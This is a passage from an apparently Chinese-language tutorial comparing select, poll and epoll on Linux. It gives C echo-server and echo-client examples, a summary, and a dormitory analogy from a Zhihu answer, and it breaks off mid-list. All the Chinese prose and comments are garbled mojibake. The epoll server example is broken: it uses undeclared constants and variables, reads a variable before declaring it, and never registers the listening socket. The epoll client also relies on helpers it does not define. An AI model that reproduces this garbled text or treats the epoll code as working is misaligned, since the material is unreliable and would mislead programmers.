ä½†æ˜¯è¯·æ³¨æ„ï¼Œå¦‚æœä¸€ç›´ä¸å¯¹è¿™ä¸ªfdä½œIOæ“ä½œ(ä»è€Œå¯¼è‡´å®ƒå†æ¬¡å˜æˆæœªå°±ç»ª)ï¼Œå†…æ ¸ä¸ä¼šå‘é€æ›´å¤šçš„é€šçŸ¥(only once)\n  \n  \n  \n  ETæ¨¡å¼åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘äº†epolläº‹ä»¶è¢«é‡å¤è§¦å‘çš„æ¬¡æ•°ï¼Œå› æ­¤æ•ˆç‡è¦æ¯”LTæ¨¡å¼é«˜ã€‚epollå·¥ä½œåœ¨ETæ¨¡å¼çš„æ—¶å€™ï¼Œå¿…é¡»ä½¿ç”¨éé˜»å¡å¥—æ¥å£ï¼Œä»¥é¿å…ç”±äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„çš„é˜»å¡è¯»/é˜»å¡å†™æ“ä½œæŠŠå¤„ç†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„ä»»åŠ¡é¥¿æ­»ã€‚\n\n\n\nå½“ä½¿ç”¨epollçš„ETæ¨¡å‹æ¥å·¥ä½œæ—¶ï¼Œå½“äº§ç”Ÿäº†ä¸€ä¸ªEPOLLINäº‹ä»¶åï¼Œè¯»æ•°æ®çš„æ—¶å€™éœ€è¦è€ƒè™‘çš„æ˜¯å½“recv()è¿”å›çš„å¤§å°å¦‚æœç­‰äºè¯·æ±‚çš„å¤§å°ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æ˜¯ç¼“å†²åŒºè¿˜æœ‰æ•°æ®æœªè¯»å®Œï¼Œä¹Ÿæ„å‘³ç€è¯¥æ¬¡äº‹ä»¶è¿˜æ²¡æœ‰å¤„ç†å®Œï¼Œæ‰€ä»¥è¿˜éœ€è¦å†æ¬¡è¯»å–ï¼š(é˜»å¡å…¶ä»–çš„)\n\n\n\n\n### 3.4 æ€»ç»“\n\n+ selectï¼Œpollå®ç°éœ€è¦è‡ªå·±ä¸æ–­è½®è¯¢æ‰€æœ‰fdé›†åˆï¼Œç›´åˆ°è®¾å¤‡å°±ç»ªï¼ŒæœŸé—´å¯èƒ½è¦ç¡çœ å’Œå”¤é†’å¤šæ¬¡äº¤æ›¿ã€‚è€Œepollå…¶å®ä¹Ÿéœ€è¦è°ƒç”¨`epoll_wait`ä¸æ–­è½®è¯¢å°±ç»ªé“¾è¡¨ï¼ŒæœŸé—´ä¹Ÿå¯èƒ½å¤šæ¬¡ç¡çœ å’Œå”¤é†’äº¤æ›¿ï¼Œä½†æ˜¯å®ƒæ˜¯è®¾å¤‡å°±ç»ªæ—¶ï¼Œè°ƒç”¨å›è°ƒå‡½æ•°ï¼ŒæŠŠå°±ç»ªfdæ”¾å…¥å°±ç»ªé“¾è¡¨ä¸­ï¼Œå¹¶å”¤é†’åœ¨`epoll_wait`ä¸­è¿›å…¥ç¡çœ çš„è¿›ç¨‹ã€‚è™½ç„¶éƒ½è¦ç¡çœ å’Œäº¤æ›¿ï¼Œä½†æ˜¯selectå’Œpollåœ¨â€œé†’ç€â€çš„æ—¶å€™è¦éå†æ•´ä¸ªfdé›†åˆï¼Œè€Œepollåœ¨â€œé†’ç€â€çš„æ—¶å€™åªè¦åˆ¤æ–­ä¸€ä¸‹å°±ç»ªé“¾è¡¨æ˜¯å¦ä¸ºç©ºå°±è¡Œäº†ï¼Œè¿™èŠ‚çœäº†å¤§é‡çš„CPUæ—¶é—´ã€‚è¿™å°±æ˜¯å›è°ƒæœºåˆ¶å¸¦æ¥çš„æ€§èƒ½æå‡ã€‚\n\n+ selectï¼Œpollæ¯æ¬¡è°ƒç”¨éƒ½è¦æŠŠfdé›†åˆä»ç”¨æˆ·æ€å¾€å†…æ ¸æ€æ‹·è´ä¸€æ¬¡ï¼Œå¹¶ä¸”è¦æŠŠcurrentå¾€è®¾å¤‡ç­‰å¾…é˜Ÿåˆ—ä¸­æŒ‚ä¸€æ¬¡\n\n  è€Œepollåªè¦ä¸€æ¬¡æ‹·è´ï¼Œè€Œä¸”æŠŠcurrentå¾€ç­‰å¾…é˜Ÿåˆ—ä¸ŠæŒ‚ä¹ŸåªæŒ‚ä¸€æ¬¡ï¼ˆåœ¨epoll_waitçš„å¼€å§‹ï¼Œæ³¨æ„è¿™é‡Œçš„ç­‰å¾…é˜Ÿåˆ—å¹¶ä¸æ˜¯è®¾å¤‡ç­‰å¾…é˜Ÿåˆ—ï¼Œåªæ˜¯ä¸€ä¸ªepollå†…éƒ¨å®šä¹‰çš„ç­‰å¾…é˜Ÿåˆ—ï¼‰ã€‚è¿™ä¹Ÿèƒ½èŠ‚çœä¸å°‘çš„å¼€é”€ã€‚\n\n+ å¦‚æœå¤„ç†çš„è¿æ¥æ•°ä¸æ˜¯å¾ˆé«˜çš„è¯ï¼Œä½¿ç”¨select/epollçš„web serverä¸ä¸€å®šæ¯”ä½¿ç”¨å¤šçº¿ç¨‹ + é˜»å¡ IOçš„web serveræ€§èƒ½æ›´å¥½ï¼Œå¯èƒ½å»¶è¿Ÿè¿˜æ›´å¤§ã€‚select/epollçš„ä¼˜åŠ¿å¹¶ä¸æ˜¯å¯¹äºå•ä¸ªè¿æ¥èƒ½å¤„ç†å¾—æ›´å¿«ï¼Œè€Œæ˜¯åœ¨äºèƒ½å¤„ç†æ›´å¤šçš„è¿æ¥ã€‚\n\n+ å¦‚æœæ²¡æœ‰å¤§é‡çš„idle -connectionæˆ–è€…dead-connectionï¼Œepollçš„æ•ˆç‡å¹¶ä¸ä¼šæ¯”select/pollé«˜å¾ˆå¤šï¼Œä½†æ˜¯å½“é‡åˆ°å¤§é‡çš„idle- connectionï¼Œå°±ä¼šå‘ç°epollçš„æ•ˆç‡å¤§å¤§é«˜äºselect/pollã€‚\n\n+ åœ¨IO multiplexing Modelä¸­ï¼Œå®é™…ä¸­ï¼Œå¯¹äºæ¯ä¸€ä¸ªsocketï¼Œä¸€èˆ¬éƒ½è®¾ç½®æˆä¸ºnon-blockingï¼Œä½†æ˜¯ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ•´ä¸ªç”¨æˆ·çš„è¿›ç¨‹å…¶å®æ˜¯ä¸€ç›´è¢«blockçš„ã€‚åªä¸è¿‡è¿›ç¨‹æ˜¯è¢«selectè¿™ä¸ªå‡½æ•°blockï¼Œè€Œä¸æ˜¯è¢«socket IOç»™blockã€‚\n\n\n\n# 4. ä»£ç \n\n### 4.1 select\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\n  int opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\tint clients[FD_SETSIZE]; \n\tfor (int i = 0; i < FD_SETSIZE; ++i) {\n\t\tclients[i] = -1;\n\t}\n\tfd_set rset, allset;\n\tFD_ZERO(&allset);\n\tFD_SET(server_id, &allset);\n\tint maxfd = server_id;\n\tint maxi = -1;\n\n\twhile (1) {\n\t\trset = allset;\n    // åªç›‘å¬è¯»æè¿°ç¬¦\n\t\tint iready = select(maxfd+1, &rset, NULL, NULL, NULL);\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"select error\");\n\t\t}\n\n\t\tif (FD_ISSET(server_id, &rset)) {\n\t\t\t// è¯´æ˜æœ‰æ–°çš„ client å†™\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\t\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 0;\n\t\t\tfor (; i < FD_SETSIZE; ++i) {\n\t\t\t\tif (clients[i] < 0) {\n\t\t\t\t\tclients[i] = client_id;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (i == FD_SETSIZE) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tFD_SET(client_id, &allset);\n\t\t\tif (client_id > maxfd) {\n\t\t\t\tmaxfd = client_id;\n\t\t\t}\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 0; i <= maxi; ++i) {\n\t\t\tint fd = clients[i];\n\t\t\tif (fd < 0) {\n\t\t\t\tcontinue;\t\n\t\t\t}\n\t\t\tif (FD_ISSET(fd, &rset)) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\n\t\t\t\t\tFD_CLR(fd, &allset);\n\t\t\t\t\tclients[i] = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn 0;\n}\n```\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.2 poll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <poll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct pollfd clients[OPEN_MAX];\n\tclients[0].fd = server_id;\n\tclients[0].events = POLLIN;\n\tfor (int i = 1; i < OPEN_MAX; i++) {\n\t\tclients[i].fd = -1;\n\t}\n\n\tint maxi = 0;\n\twhile (1) {\n    // ç›‘å¬ POLLIN äº‹ä»¶\n\t\tint iready = poll(clients, maxi+1, -1);\t\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"poll error\");\n\t\t}\n\t\t\n    // è¯´æ˜ client æ¥äº†å†™\n\t\tif (clients[0].revents & POLLIN) {\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 1;\n\t\t\tfor (; i < OPEN_MAX; ++i) {\n\t\t\t\tif (clients[i].fd < 0) {\n\t\t\t\t\tclients[i].fd = client_id;\t\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (i == OPEN_MAX) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\n\t\t\tclients[i].events = POLLIN;\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 1; i <= maxi; ++i) {\n\t\t\tif (clients[i].fd < 0) {\n\t\t\t\tcontinue;\n\t\t\t}\t\n\n\t\t\tif (clients[i].revents & POLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\t\t\t\t\tclients[i].fd = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(clients[i].fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.3 epoll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/epoll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\n\nvoid add_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_ADD, fd, &ev);\n}\nvoid modify_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_MOD, fd, &ev);\n}\nvoid delete_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_DEL, fd, &ev);\n}\n\n\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FDSIZE);\n\n\tstruct epoll_event ev;\n\tev.events = EPOLLIN;\n\tev.data.fd = STDIN_FILENO;\n\tepoll_ctl(epollfd, EPOLL_CTL_ADD, STDIN_FILENO, &ev);\n\n\twhile (1) {\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\t\t\tif (fd == server_id && (events[i].events & EPOLLIN)) {\n\t\t\t\tsocklen_t len = sizeof(client);\n\t\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\t\tstruct epoll_event ev;\n\t\t\t\tev.events = state;\n\t\t\t\tev.data.fd = fd;\n\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_ADD,fd,&ev);\n\n\t\t\t} else if (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLOUT;//ç”±è¯»æ”¹ä¸ºå†™\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t}\n\t\t\t\tint n = Write(fd, buf, n);\n\t\t\t\tif (n < 0) {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;//ç”±å†™æ”¹ä¸ºè¯»\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(epollfd);\n\n\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/epoll.h>\n#include <arpa/inet.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include \"wrap.h\"\n#include \"epollUtil.h\"\n\n#define IP \"127.0.0.1\"\n#define PORT 8000\n#define FD_SIZE 1024\n#define EPOLLEVENTS 20\nint main(int agrc, char* argv[]) {\n\tchar buf[1024];\n\tmemset(buf, 0, sizeof(buf));\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\n\tserver.sin_family = AF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(AF_INET, IP, &server.sin_addr);\n\t\n\n\tint server_id = Socket(AF_INET, SOCK_STREAM, 0);\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FD_SIZE);\n\tadd_event(epollfd, STDIN_FILENO, EPOLLIN);\n\twhile (1) {\n\t\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\n\t\t\tif (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\t\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\t\n\t\t\t\t} else {\n\t\t\t\t\tif (fd == STDIN_FILENO) {\n\t\t\t\t\t\tadd_event(epollfd, server_id, EPOLLOUT);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tdelete_event(epollfd, server_id, EPOLLIN);\t\n\t\t\t\t\t\tadd_event(epollfd, STDOUT_FILENO, EPOLLOUT);\n\t\t\t\t\t}\t\n\t\t\t\t}\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tWrite(fd, buf, strlen(buf));\t\n\t\t\t\tif (fd == STDOUT_FILENO) {\n\t\t\t\t\tdelete_event(epollfd, fd, EPOLLOUT);\n\t\t\t\t} else {\n\t\t\t\t\tmodify_event(epollfd, fd, EPOLLIN);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.4 æ€»ç»“\n\n+ select \n\n  æ­»å¾ªç¯é‡Œç”¨ select é˜»å¡, è¿”å›åå¼€å§‹éå†\n\n+ poll\n\n  æ­»å¾ªç¯é‡Œç”¨ poll é˜»å¡, è¿”å›åå¼€å§‹éå†\n\n+ epoll\n\n  æ­»å¾ªç¯é‡Œç”¨ epoll_wait é˜»å¡\n\n\n\n# 5. å¤´è„‘é£æš´\n\n### 5.1  å¤šè·¯å¤ç”¨ VS å¤šçº¿ç¨‹+ é˜»å¡IO\n\nä¹Ÿè®¸æœ‰æœ‹å‹ä¼šè¯´ï¼Œæˆ‘å¯ä»¥é‡‡ç”¨ å¤šçº¿ç¨‹+ é˜»å¡IO è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœï¼Œä½†æ˜¯ç”±äºåœ¨å¤šçº¿ç¨‹ + é˜»å¡IO ä¸­ï¼Œæ¯ä¸ªsocketå¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ ·ä¼šé€ æˆå¾ˆå¤§çš„èµ„æºå ç”¨ï¼Œå¹¶ä¸”å°¤å…¶æ˜¯å¯¹äºé•¿è¿æ¥æ¥è¯´ï¼Œçº¿ç¨‹çš„èµ„æºä¸€ç›´ä¸ä¼šé‡Šæ”¾ï¼Œå¦‚æœåé¢é™†ç»­æœ‰å¾ˆå¤šè¿æ¥çš„è¯ï¼Œå°±ä¼šé€ æˆæ€§èƒ½ä¸Šçš„ç“¶é¢ˆã€‚\n\nè€Œå¤šè·¯å¤ç”¨IOæ¨¡å¼ï¼Œé€šè¿‡ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥ç®¡ç†å¤šä¸ªsocketï¼Œåªæœ‰å½“socketçœŸæ­£æœ‰è¯»å†™äº‹ä»¶å‘ç”Ÿæ‰ä¼šå ç”¨èµ„æºæ¥è¿›è¡Œå®é™…çš„è¯»å†™æ“ä½œã€‚å› æ­¤ï¼Œå¤šè·¯å¤ç”¨IOæ¯”è¾ƒé€‚åˆè¿æ¥æ•°æ¯”è¾ƒå¤šçš„æƒ…å†µã€‚\n\nå¦å¤–å¤šè·¯å¤ç”¨IOä¸ºä½•æ¯”éé˜»å¡IOæ¨¡å‹çš„æ•ˆç‡é«˜æ˜¯å› ä¸ºåœ¨éé˜»å¡IOä¸­ï¼Œä¸æ–­åœ°è¯¢é—®socketçŠ¶æ€æ—¶é€šè¿‡ç”¨æˆ·çº¿ç¨‹å»è¿›è¡Œçš„ï¼Œè€Œåœ¨å¤šè·¯å¤ç”¨IOä¸­ï¼Œè½®è¯¢æ¯ä¸ªsocketçŠ¶æ€æ˜¯å†…æ ¸åœ¨è¿›è¡Œçš„ï¼Œè¿™ä¸ªæ•ˆç‡è¦æ¯”ç”¨æˆ·çº¿ç¨‹è¦é«˜çš„å¤šã€‚\n\n\n\n### 5.2  æˆ‘åœ¨çŸ¥ä¹çš„å›ç­”\n\nhttps://www.zhihu.com/question/32163005/answer/300165049\n\nIOæ¨¡å¼ä¸€èˆ¬åˆ†ä¸ºåŒæ­¥IOå’Œå¼‚æ­¥IO. åŒæ­¥IOä¼šé˜»å¡è¿›ç¨‹, å¼‚æ­¥IOä¸ä¼šé˜»å¡è¿›ç¨‹. ç›®å‰linuxä¸Šå¤§éƒ¨åˆ†ç”¨çš„æ˜¯åŒæ­¥IO, å¼‚æ­¥IOåœ¨linuxä¸Šç›®å‰è¿˜ä¸æˆç†Ÿ, ä¸è¿‡windowsçš„iocpç®—æ˜¯çœŸæ­£çš„å¼‚æ­¥IOã€‚\n\n\n\nåŒæ­¥IOåˆåˆ†ä¸ºé˜»å¡IO, éé˜»å¡IO, IOå¤šè·¯å¤ç”¨. What? åŒæ­¥IOæ˜æ˜ä¼šé˜»å¡è¿›ç¨‹,ä¸ºä»€ä¹ˆä¹ŸåŒ…æ‹¬éé˜»å¡IO? å› ä¸ºéé˜»å¡IOè™½ç„¶åœ¨è¯·æ±‚æ•°æ®æ—¶ä¸é˜»å¡, ä½†çœŸæ­£æ•°æ®æ¥ä¸´æ—¶,ä¹Ÿå°±æ˜¯å†…æ ¸æ•°æ®æ‹·è´åˆ°ç”¨æˆ·æ•°æ®æ—¶, æ­¤æ—¶è¿›ç¨‹æ˜¯é˜»å¡çš„.\n\n\n\né‚£ä¹ˆè¿™äº›IOæ¨¡å¼çš„åŒºåˆ«åˆ†åˆ«æ˜¯ä»€ä¹ˆ? æ¥ä¸‹æ¥ä¸¾ä¸ªå°ä¾‹å­æ¥è¯´æ˜. å‡è®¾ä½ ç°åœ¨å»å¥³ç”Ÿå®¿èˆæ¥¼æ‰¾è‡ªå·±çš„å¥³ç¥, ä½†æ˜¯ä½ åªçŸ¥é“å¥³ç¥çš„æ‰‹æœºå·,å¹¶ä¸çŸ¥é“å¥³ç¥çš„å…·ä½“æˆ¿é—´\n\n\n\nå…ˆè¯´åŒæ­¥IOçš„æƒ…å†µ,\n\n1. é˜»å¡IO, ç»™å¥³ç¥å‘ä¸€æ¡çŸ­ä¿¡, è¯´æˆ‘æ¥æ‰¾ä½ äº†, ç„¶åå°±é»˜é»˜çš„ä¸€ç›´ç­‰ç€å¥³ç¥ä¸‹æ¥¼, è¿™ä¸ªæœŸé—´é™¤äº†ç­‰å¾…ä½ ä¸ä¼šåšå…¶ä»–äº‹æƒ…, å±äºå¤‡èƒåšæ³•.\n\n\n\n2. éé˜»å¡IO, ç»™å¥³ç¥å‘çŸ­ä¿¡, å¦‚æœä¸å›, æ¥ç€å†å‘, ä¸€ç›´å‘åˆ°å¥³ç¥ä¸‹æ¥¼, è¿™ä¸ªæœŸé—´ä½ å¯ä»¥åœ¨ä¸¤æ¬¡å‘çŸ­ä¿¡é—´éš™å–å£æ°´ï¼Œå±äºä¸“ä¸€åšæ³•.\n\n\n\n3. IOå¤šè·¯å¤ç”¨, æ˜¯æ‰¾ä¸€ä¸ªå®¿ç®¡å¤§å¦ˆæ¥å¸®ä½ ç›‘è§†ä¸‹æ¥¼çš„å¥³ç”Ÿ, è¿™ä¸ªæœŸé—´ä½ å¯ä»¥äº›å…¶ä»–çš„äº‹æƒ…. ä¾‹å¦‚å¯ä»¥é¡ºä¾¿çœ‹çœ‹å…¶ä»–å¦¹å­,ç©ç©ç‹è€…è£è€€, ä¸Šä¸ªå•æ‰€ç­‰ç­‰. IOå¤ç”¨åˆåŒ…æ‹¬ select, poll, epoll æ¨¡å¼. é‚£ä¹ˆå®ƒä»¬çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ?\n\n\n\n3.1 selectå¤§å¦ˆ æ¯ä¸€ä¸ªå¥³ç”Ÿä¸‹æ¥¼, selectå¤§å¦ˆéƒ½ä¸çŸ¥é“è¿™ä¸ªæ˜¯ä¸æ˜¯ä½ çš„å¥³ç¥, å¥¹éœ€è¦ä¸€ä¸ªä¸€ä¸ªè¯¢é—®, å¹¶ä¸”selectå¤§å¦ˆèƒ½åŠ›è¿˜æœ‰é™, æœ€å¤šä¸€æ¬¡å¸®ä½ ç›‘è§†1024ä¸ªå¦¹å­\n\n\n\n3.2 